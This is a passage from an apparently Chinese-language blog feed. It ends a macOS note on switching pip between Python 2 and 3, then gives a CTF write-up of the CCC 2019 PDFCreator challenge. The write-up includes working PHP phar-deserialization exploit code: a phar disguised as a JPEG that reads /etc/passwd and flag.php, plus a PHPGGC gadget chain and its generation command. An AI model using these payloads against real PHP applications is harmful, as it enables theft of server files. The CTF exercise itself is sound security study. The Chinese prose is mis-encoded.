class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">~ Â» sudo easy_install pip                 littlechieh6@bogon<br>Password:<br>Searching <span class="hljs-keyword">for</span> pip<br>Best match: pip 20.2b1<br>Processing pip-20.2b1-py2.7.egg<br>pip 20.2b1 is already the active version <span class="hljs-keyword">in</span> easy-install.pth<br>Installing pip script to /usr/<span class="hljs-built_in">local</span>/bin<br>Installing pip3.8 script to /usr/<span class="hljs-built_in">local</span>/bin<br>Installing pip3 script to /usr/<span class="hljs-built_in">local</span>/bin<br><br>Using /Library/Python/2.7/site-packages/pip-20.2b1-py2.7.egg<br>Processing dependencies <span class="hljs-keyword">for</span> pip<br>Finished processing dependencies <span class="hljs-keyword">for</span> pip<br>-------------------------------------------------------------<br>~ Â» pip3 --version                        littlechieh6@bogon<br>pip 20.2b1 from /Library/Python/2.7/site-packages/pip-20.2b1-py2.7.egg/pip (python 2.7)<br>-------------------------------------------------------------<br>~ Â» pip --version                         littlechieh6@bogon<br>pip 20.2b1 from /Library/Python/2.7/site-packages/pip-20.2b1-py2.7.egg/pip (python 2.7)<br></code></pre></td></tr></table></figure><p>æˆ–è€…ä½¿ç”¨bootstrap.pypa.ioç½‘ç«™çš„get-pip.pyè„šæœ¬å®‰è£…pip3ï¼Œä¼šå¯¼è‡´pipå’Œpip3éƒ½å˜æˆpip3</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">~/Desktop Â» curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py<br><br>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current<br>                                 Dload  Upload   Total   Spent    Left  Speed<br>  0     0    0     0    0     0      0      0 --:--:-- --:--:  1 1842k    1 20565    0     0  43294      0  0:00:43 --:--: 50 1842k   50  935k    0     0   626k      0  0:00:02  0:00:100 1842k  100 1842k    0     0   848k      0  0:00:02  0:00:02 --:--:--  848k<br>-------------------------------------------------------------<br>~/Desktop Â» sudo python3 get-pip.py<br>-------------------------------------------------------------<br>~/Desktop Â» pip --version                 littlechieh6@bogon<br>pip 20.3.3 from /Library/Python/3.8/site-packages/pip (python 3.8)<br>-------------------------------------------------------------<br>~/Desktop Â» pip3 --version                littlechieh6@bogon<br>pip 20.3.3 from /Library/Python/3.8/site-packages/pip (python 3.8)<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹Python2å’ŒPython3çš„æ‰§è¡Œä½ç½®</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">~ Â» <span class="hljs-built_in">which</span> python3                         littlechieh6@bogon<br>/usr/bin/python3<br>-------------------------------------------------------------<br>~ Â» <span class="hljs-built_in">which</span> python                          littlechieh6@bogon<br>/usr/bin/python<br>-------------------------------------------------------------<br>~ Â» ls -al /usr/bin/python3               littlechieh6@bogon<br>-rwxr-xr-x  1 root  wheel  31488 Sep 22 08:29 /usr/bin/python3<br>-------------------------------------------------------------<br>~ Â» ls -al /usr/bin/python                littlechieh6@bogon<br>lrwxr-xr-x  1 root  wheel  75 Jul  1 08:44 /usr/bin/python -&gt; ../../System/Library/Frameworks/Python.framework/Versions/2.7/bin/python2.7<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹pipçš„æ‰§è¡Œä½ç½®</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">~ Â» <span class="hljs-built_in">which</span> pip                             littlechieh6@bogon<br>/usr/<span class="hljs-built_in">local</span>/bin/pip<br>-------------------------------------------------------------<br>~ Â» <span class="hljs-built_in">which</span> pip3                            littlechieh6@bogon<br>/usr/<span class="hljs-built_in">local</span>/bin/pip3<br>-------------------------------------------------------------<br>~ Â» ls -al /usr/<span class="hljs-built_in">local</span>/bin/pip             littlechieh6@bogon<br>-rwxr-xr-x  1 root  admin  263 Dec 21 22:56 /usr/<span class="hljs-built_in">local</span>/bin/pip<br>-------------------------------------------------------------<br>~ Â» ls -al /usr/<span class="hljs-built_in">local</span>/bin/pip3            littlechieh6@bogon<br>-rwxr-xr-x  1 root  admin  263 Dec 21 22:56 /usr/<span class="hljs-built_in">local</span>/bin/pip3<br></code></pre></td></tr></table></figure><p>åŸpipå’Œpip3è„šæœ¬ï¼Œå…³é”®ç‚¹åœ¨äº<code>#!</code>ä»£è¡¨æ‰§è¡Œè„šæœ¬çš„è·¯å¾„ã€‚ç”±äºpipå’Œpip3éƒ½æ˜¯ç”±python3æ‰§è¡Œï¼Œæ‰€ä»¥ä½¿ç”¨<code>pip -V</code>å’Œ<code>pip3 -V</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/Applications/Xcode.app/Contents/Developer/usr/bin/python3</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> pip._internal.cli.main <span class="hljs-keyword">import</span> main<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    sys.argv[<span class="hljs-number">0</span>] = re.sub(<span class="hljs-string">r&#x27;(-script\.pyw|\.exe)?$&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, sys.argv[<span class="hljs-number">0</span>])<br>    sys.exit(main())<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨<code>vim /usr/local/bin/pip</code>å°†è§£é‡Šå™¨æŒ‡å‘Python2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/System/Library/Frameworks/Python.framework/Versions/2.7/bin/python2.7</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> pip._internal.cli.main <span class="hljs-keyword">import</span> main<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    sys.argv[<span class="hljs-number">0</span>] = re.sub(<span class="hljs-string">r&#x27;(-script\.pyw|\.exe)?$&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, sys.argv[<span class="hljs-number">0</span>])<br>    sys.exit(main())<br></code></pre></td></tr></table></figure><h1 id="ä¸‰ã€æ•ˆæœ"><a href="#ä¸‰ã€æ•ˆæœ" class="headerlink" title="ä¸‰ã€æ•ˆæœ"></a>ä¸‰ã€æ•ˆæœ</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">~ Â» pip -V                                littlechieh6@bogon<br>pip 20.2b1 from /Library/Python/2.7/site-packages/pip-20.2b1-py2.7.egg/pip (python 2.7)<br>-------------------------------------------------------------<br>~ Â» pip3 -V                               littlechieh6@bogon<br>pip 20.3.3 from /Library/Python/3.8/site-packages/pip (python 3.8)<br></code></pre></td></tr></table></figure><p>å‚è€ƒæ•™ç¨‹ï¼š</p><ol><li><a href="https://blog.csdn.net/u014259820/article/details/100580970">https://blog.csdn.net/u014259820/article/details/100580970</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>ç¼–ç¨‹</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PDFCreatoré¢˜è§£</title>
    <link href="/2020/10/31/2020%E5%B9%B410%E6%9C%8831%E6%97%A5-PDFCreator%E9%A2%98%E8%A7%A3/"/>
    <url>/2020/10/31/2020%E5%B9%B410%E6%9C%8831%E6%97%A5-PDFCreator%E9%A2%98%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<p>è¯¥é¢˜ä¸º phar ååºåˆ—åŒ–ï¼Œä¸Šä¼ æ–‡ä»¶è¦æ±‚ä¸ºå›¾ç‰‡ã€‚æ„Ÿè§‰ phpggc å·¥å…·æŒºé¦™çš„ï¼Œå†³å®šåˆ†äº«ä¸€ä¸‹ã€‚</p><p>æ¯”èµ›åœ°å€ï¼š<a href="https://ctftime.org/event/854/tasks/">Chaos Communication Camp 2019 </a><br>é¢˜è§£1:<a href="https://teamrocketist.github.io/2019/08/25/Web-Chaos-Communication-Camp-2019-CTF-pdfcreator/">[Web] Chaos Communication Camp 2019 CTF - pdfcreator</a><br>é¢˜è§£2:<a href="https://medium.com/@craig.knott92/ccc-2019-ctf-pdfcreator-9c76fd60452d">CCC 2019 CTF â€” PDFCreator</a></p><hr><a id="more"></a><p>ï¼ˆpsï¼šä¸ºå•¥çªç„¶åšè¿™é¢˜ï¼ŸæŸä¸ªå¤§ä½¬ä¸¢ç»™æˆ‘çš„ï¼Œé¡ºæ‰‹å°±è¹­äº†ä¸ªç¯å¢ƒï¼Œæ¯•ç«Ÿæ­å»ºç¯å¢ƒæŒºéº»çƒ¦çš„ï¼Œè¡¥é¢˜éƒ½æ¥ä¸åŠ</p><p>é¦–å…ˆä½“éªŒä¸€ä¸‹ç½‘ç«™ï¼Œä¸Šä¼ éœ€è¦å›¾ç‰‡å°äº 500KBï¼Œä»ç½‘ä¸Šæ‰¾äº†ä¸€å¼ å›¾ç‰‡ 5kã€‚ä¸Šä¼ åè¿”å›ç»“æœã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># é¡¶éƒ¨æ˜¾ç¤ºï¼šUpload successful: upload/fd456406745d816a45cae554c788e754.jpg</span><br><br>&lt;h1&gt;Converted by CoolPDF&lt;/h1&gt;&lt;h3&gt;We hope you enjoyed our service!&lt;/h3&gt;<br>     &lt;img src=<span class="hljs-string">&quot;upload/fd456406745d816a45cae554c788e754.jpg&quot;</span>&gt;<br>      <br></code></pre></td></tr></table></figure><p>ç„¶åå†æ¬¡æäº¤ï¼Œè¿”å›ç»“æœä¸º</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># TCPDF ERROR: Unable to create output file: /var/www/html/output/81f851fd84a2591f4608f9a7715095ad.pdf</span><br></code></pre></td></tr></table></figure><p>èµ·åˆå¯¹ phar ä¸å¤ªç†Ÿæ‚‰ï¼Œåªæœ‰å¤§è‡´çš„äº†è§£ã€‚å¼€å§‹æµ‹è¯•ä½¿ç”¨é¢˜è§£ 1 çš„ payloadï¼Œå¹¶æœªä¿®æ”¹ä»»ä½•ä¸œè¥¿ï¼Œpayload æ‰“ä¸Šå»æ²¡æœ‰ä»»ä½•ç»“æœã€‚(å®é™…ä¸Šåº”è¯¥æ˜¯æœ‰ç»“æœçš„ï¼Œåœ¨ html æºç é‡Œï¼Œä¸ä¼šç›´æ¥å‘ˆç°åœ¨é¡µé¢)<br>ç•Œé¢<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20201031235650.png"><br>æºç <br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20201031235615.png"></p><p>çŸ¥é“çœŸç›¸ï¼Œ(-.-)# ç›´æ¥æ°”å“­ã€‚ä»¥åè®°å¾—å¤šçœ‹æºç ï¼å¤šçœ‹æºç ï¼å¤šçœ‹æºç ï¼</p><hr><h1 id="æ–¹æ³•1-æ‰‹å†™phar"><a href="#æ–¹æ³•1-æ‰‹å†™phar" class="headerlink" title="æ–¹æ³•1:æ‰‹å†™phar"></a>æ–¹æ³•1:æ‰‹å†™phar</h1><p>é¦–å…ˆåˆ›å»º phar.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;creator.php&quot;</span>;<br>$jpeg_header_size =<br><span class="hljs-string">&quot;\xff\xd8\xff\xe0\x00\x10\x4a\x46\x49\x46\x00\x01\x01\x01\x00\x48\x00\x48\x00\x00\xff\xfe\x00\x13&quot;</span>.<br><span class="hljs-string">&quot;\x43\x72\x65\x61\x74\x65\x64\x20\x77\x69\x74\x68\x20\x47\x49\x4d\x50\xff\xdb\x00\x43\x00\x03\x02&quot;</span>.<br><span class="hljs-string">&quot;\x02\x03\x02\x02\x03\x03\x03\x03\x04\x03\x03\x04\x05\x08\x05\x05\x04\x04\x05\x0a\x07\x07\x06\x08\x0c\x0a\x0c\x0c\x0b\x0a\x0b\x0b\x0d\x0e\x12\x10\x0d\x0e\x11\x0e\x0b\x0b\x10\x16\x10\x11\x13\x14\x15\x15&quot;</span>.<br><span class="hljs-string">&quot;\x15\x0c\x0f\x17\x18\x16\x14\x18\x12\x14\x15\x14\xff\xdb\x00\x43\x01\x03\x04\x04\x05\x04\x05\x09\x05\x05\x09\x14\x0d\x0b\x0d\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14&quot;</span>.<br><span class="hljs-string">&quot;\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\xff\xc2\x00\x11\x08\x00\x0a\x00\x0a\x03\x01\x11\x00\x02\x11\x01\x03\x11\x01&quot;</span>.<br><span class="hljs-string">&quot;\xff\xc4\x00\x15\x00\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xff\xc4\x00\x14\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xda\x00\x0c\x03&quot;</span>.<br><span class="hljs-string">&quot;\x01\x00\x02\x10\x03\x10\x00\x00\x01\x95\x00\x07\xff\xc4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x01\x05\x02\x1f\xff\xc4\x00\x14\x11&quot;</span>.<br><span class="hljs-string">&quot;\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x03\x01\x01\x3f\x01\x1f\xff\xc4\x00\x14\x11\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20&quot;</span>.<br><span class="hljs-string">&quot;\xff\xda\x00\x08\x01\x02\x01\x01\x3f\x01\x1f\xff\xc4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x06\x3f\x02\x1f\xff\xc4\x00\x14\x10\x01&quot;</span>.<br><span class="hljs-string">&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x01\x3f\x21\x1f\xff\xda\x00\x0c\x03\x01\x00\x02\x00\x03\x00\x00\x00\x10\x92\x4f\xff\xc4\x00\x14\x11\x01\x00&quot;</span>.<br><span class="hljs-string">&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x03\x01\x01\x3f\x10\x1f\xff\xc4\x00\x14\x11\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda&quot;</span>.<br><span class="hljs-string">&quot;\x00\x08\x01\x02\x01\x01\x3f\x10\x1f\xff\xc4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x01\x3f\x10\x1f\xff\xd9&quot;</span>;<br>$phar = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br>$phar-&gt;startBuffering();<br>$phar-&gt;addFromString(<span class="hljs-string">&quot;test.txt&quot;</span>,<span class="hljs-string">&quot;test&quot;</span>);<br>$phar-&gt;setStub($jpeg_header_size.<span class="hljs-string">&quot; __HALT_COMPILER(); ?&gt;&quot;</span>);<br>$o = <span class="hljs-keyword">new</span> \PDFStuff\PDFCreator();<br>$o-&gt;tmpfile = <span class="hljs-string">&quot;/etc/passwd&quot;</span>;<br>$phar-&gt;setMetadata($o);<br>$phar-&gt;stopBuffering();<br></code></pre></td></tr></table></figure><p>ç„¶åæ‰§è¡Œå‘½ä»¤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">php phar.php<br>mv phar.phar phar.jpeg<br></code></pre></td></tr></table></figure><p>å°†æ–‡ä»¶ä¸Šä¼ ï¼Œå¹¶æ·»åŠ  phar åŒ…è£…å™¨ï¼Œç±»ä¼¼ä¸‹é¢çš„æ ¼å¼</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Converted by CoolPDF<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>We hope you enjoyed our service!<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;phar://upload/708697c63f7eb369319c6523380bdf7a_11.jpg&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>æœ€åå¯ä»¥å¾—åˆ°ç»“æœï¼ˆä½¿ç”¨ /etc/passwd å®¹æ˜“å›æ˜¾ï¼Œä»¥åæœ¬åœ°æ–‡ä»¶åŒ…å«çš„æ—¶å€™å°½é‡ç”¨è¿™ä¸ªæ–‡ä»¶å§ï¼‰<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/03C73EAE-9B6D-4097-86BF-675DAD58D598.png"></p><p>æ¥ç€å¼€å§‹è¯»/etc/apache2/sites-enabled/000-default.confï¼ˆä¿®æ”¹ä¸Šæ–¹é«˜äº®å‡ºï¼‰ï¼Œå¯ä»¥ä»è¿™ä¸ªæ–‡ä»¶ä¸­åˆ¤æ–­æ–‡ä»¶è·¯å¾„ã€‚åœ¨æ‰§è¡Œç¬¬ä¸€è¡Œå‘½ä»¤çš„æ—¶å€™å¯èƒ½ä¼šæŠ¥é”™(ä¸€å †è¾“å‡º)ï¼Œå¯ä»¥ä¸ç”¨ç†ä¼šã€‚æœ€ç»ˆå¾—åˆ°webçš„æ ¹è·¯å¾„ä¸º /var/www/htmlã€‚è®¾ç½®$o-&gt;tmpfile = â€œ /var/www/html/flag.phpâ€ï¼Œä½¿ç”¨ F12 æŸ¥çœ‹æºç å³å¯å¾—åˆ° flagã€‚</p><blockquote><p>$flag = â€œflag{7f5c676fb4a062752124bcaf69a01701}â€;</p></blockquote><hr><h1 id="æ–¹æ³•2-ä½¿ç”¨-PHPGGC-æ¥å®ç°-LFIï¼ˆLocal-File-Includeï¼‰"><a href="#æ–¹æ³•2-ä½¿ç”¨-PHPGGC-æ¥å®ç°-LFIï¼ˆLocal-File-Includeï¼‰" class="headerlink" title="æ–¹æ³•2: ä½¿ç”¨ PHPGGC æ¥å®ç° LFIï¼ˆLocal File Includeï¼‰"></a>æ–¹æ³•2: ä½¿ç”¨ PHPGGC æ¥å®ç° LFIï¼ˆLocal File Includeï¼‰</h1><p>ä¸‹è½½å¹¶ä¸”åˆå§‹åŒ– phpggcï¼ˆå¤åˆ¶æ¨¡ç‰ˆï¼‰ã€‚</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/ambionics/</span>phpggc<br>$ cd phpggc<br>$ mkdir gadgetchains<span class="hljs-regexp">/Alles/</span> &amp;&amp; mkdir gadgetchains<span class="hljs-regexp">/Alles/</span>FR &amp;&amp; mkdir gadgetchains<span class="hljs-regexp">/Alles/</span>FR/<span class="hljs-number">1</span> <br>$ cp templates<span class="hljs-regexp">/* gadgetchains/</span>Alles<span class="hljs-regexp">/FR/</span><span class="hljs-number">1</span>/*<br></code></pre></td></tr></table></figure><p>ä¿®æ”¹ gadgetchains/Alles/FR/1/ ä¸‹çš„ chain.phpã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">PDFStuff</span> &#123;<br>  <span class="hljs-title">class</span> <span class="hljs-title">PDFCreator</span> &#123; <span class="hljs-title">public</span> $<span class="hljs-title">tmpfile</span>; &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title">GadgetChain</span>\<span class="hljs-title">Alles</span> &#123;<br>    <span class="hljs-title">class</span> <span class="hljs-title">FR1</span> <span class="hljs-title">extends</span> \<span class="hljs-title">PHPGGC</span>\<span class="hljs-title">GadgetChain</span>\<span class="hljs-title">FileRead</span> &#123;<br>        public static $version = &#x27;1.00&#x27;;<br>        <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> $vector = <span class="hljs-string">&#x27;__destruct&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> $author = <span class="hljs-string">&#x27;teamrocketist&#x27;</span>;<br><br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">generate</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> $parameters</span>) </span>&#123;<br>            $a = <span class="hljs-keyword">new</span> \PDFStuff\PDFCreator();<br>            $a-&gt;tmpfile = $parameters[<span class="hljs-string">&quot;remote_file&quot;</span>]; <span class="hljs-comment">// file to read</span><br>            <span class="hljs-keyword">return</span> $a;<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>ç”Ÿæˆ phar çš„å›¾ç‰‡ï¼Œä½¿ç”¨ /etc/passwd æ›´å®¹æ˜“å›æ˜¾ç»“æœï¼ˆæœ‰çš„ php æºç åœ¨æµè§ˆå™¨ä¸­éœ€è¦æŸ¥çœ‹æºç æ‰èƒ½çœ‹åˆ°ï¼Œæ¯”å¦‚ flag.phpï¼‰</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">./phpggc Alles/FR1 /etc/passwd -f -pj ../dummy.jpg -o ../exploit.jpg<br><br></code></pre></td></tr></table></figure><p>ç„¶åå’Œä¸Šé¢çš„æ­¥éª¤ä¸€æ ·ï¼Œä¸Šä¼ å°±å¯ä»¥è¯»å–æ–‡ä»¶ã€‚<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/254F244D-5867-46BA-9C85-A952E884343C.png"></p><hr><h1 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h1><p>åœ¨é¢˜è§£ä¸­ï¼Œå‘ç°ä¸€ä¸ªéå¸¸å¼ºå¤§çš„å·¥å…·â€”â€”PHPGGC</p><p>PHPGGC æ˜¯ä¸€æ¬¾èƒ½å¤Ÿè‡ªåŠ¨ç”Ÿæˆä¸»æµæ¡†æ¶çš„åºåˆ—åŒ–æµ‹è¯• payload çš„å·¥å…·,å¯ä»¥è¯´æ˜¯ååºåˆ—åŒ–çš„æ­¦å™¨åº“,å¹³æ—¶é‡åˆ°æœ‰å…³ååºåˆ—åŒ–çš„é¢˜ç›®æ—¶å¦‚æœèƒ½å¤Ÿç†Ÿç»ƒè¿ç”¨å®ƒï¼Œå°†èŠ‚çœå¤§é‡åŠŸå¤«ã€‚</p><p>å¯ä»¥åˆ›å»ºè‡ªå·±çš„æ¨¡å—ï¼Œä½¿ç”¨å‘½ä»¤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> git <span class="hljs-built_in">clone</span> https://github.com/ambionics/phpggc</span><br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">cd</span> phpggc</span><br><span class="hljs-meta">$</span><span class="bash"> mkdir gadgetchains/Alles/ &amp;&amp; mkdir gadgetchains/Alles/FR &amp;&amp; mkdir gadgetchains/Alles/FR/1</span><br><span class="hljs-meta">$</span><span class="bash"> cp templates/* gadgetchains/Alles/FR/1/*</span><br></code></pre></td></tr></table></figure><p>é»˜è®¤çš„æ¨¡ç‰ˆ chain.phpï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">GadgetChain</span>\&#123;<span class="hljs-title">NAME</span>&#125;;<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> </span>&#123;CLASS_NAME&#125; <span class="hljs-keyword">extends</span> \&#123;BASE_CLASS_NAME&#125;<br>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> $version = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> $vector = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> $author = <span class="hljs-string">&#x27;&#x27;</span>;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">generate</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> $parameters</span>)</span><br><span class="hljs-function">    </span>&#123;<br><br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>å‚è€ƒæ–‡ç« ä¸­çš„æ¨¡å— chain.phpï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">PDFStuff</span> &#123;<br>  <span class="hljs-title">class</span> <span class="hljs-title">PDFCreator</span> &#123; <span class="hljs-title">public</span> $<span class="hljs-title">tmpfile</span>; &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title">GadgetChain</span>\<span class="hljs-title">Alles</span> &#123;<br>    <span class="hljs-title">class</span> <span class="hljs-title">FR1</span> <span 